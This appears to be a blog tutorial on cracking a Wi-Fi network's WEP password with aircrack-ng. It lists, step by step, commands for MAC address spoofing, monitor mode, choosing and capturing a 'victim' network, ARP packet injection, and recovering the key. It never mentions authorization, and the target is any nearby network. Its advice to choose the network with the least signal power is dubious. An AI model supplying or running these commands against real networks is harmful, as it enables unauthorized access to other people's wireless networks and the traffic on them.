---
layout: post
title: "Crack WIFI network's WEP password with Aircrack"
description: "How to crack a WIFI network's WEP password with Aircrack suite"
redirect_from: /article/crack-wifi-network-s-wep-password-with-aircrack/
locale: en
---

The first step is to [download](http://www.aircrack-ng.org/) the Aicrack-ng suite.

In order to decrypt the WEP key we have to follow the next simple steps:

First, change your hardware address (MAC):

    ifconfig wlan0 down
    ifconfig wlan0 hw ether 00:11:22:33:44:55

Now, start package monitoring in the wifi interface (peg: `wlan0`), for it, we have to use `airmon-ng` tool:

    airmon-ng start wlan0

At this point we need the data necessary to attack the interested network, we will obtain it with:

    airodump-ng wlan0

It will prompt something like this:

![Airdump Victim Data]({{ site.url }}/assets/posts/airdump-victim-data.png)

This step is only to get the information to attack the net. From all the networks, probably the best choose will be the one with the less power (PWR column). Once we have chosen one of those, we have to remember the blue data, the **BSSID** (MAC address of the Access point), **PWR** (Power of the signal), **CH** (Channel of the network), **ENC** and **CIPHER** (Network security type) and **ESSID** (Access Point name).

Once we have all the data needed to crack the wifi we can start sniffing packets of the interested network. In our case we have selected `WLAN_DF`, in channel 2 with BSSID `00:23:F8:A0:C4:A2`:

    airodump-ng -c 2 -w packets --bssid 00:23:F8:A0:C4:A2 wlan0

At this point we only have to wait to collect about 20000 - 40000 packages, it depends from the network use.

### Optional, packets injection
If our wifi driver supports packet injection we can increase collection speed by using the `aireplay-ng` tool.

    aireplay-ng -1 0 -a 00:23:F8:A0:C4:A2 -h 00:11:22:33:44:55 -e WLAN_DF wlan0
    aireplay-ng -3 -b 00:23:F8:A0:C4:A2 -h 00:11:22:33:44:55 wlan0

### Getting the network key
Once recollected a good amount of packages (20000 - 40000) we can try to decrypt the key with the final tool, `aircrack-ng`:

    aircrack-ng packets-01.cap
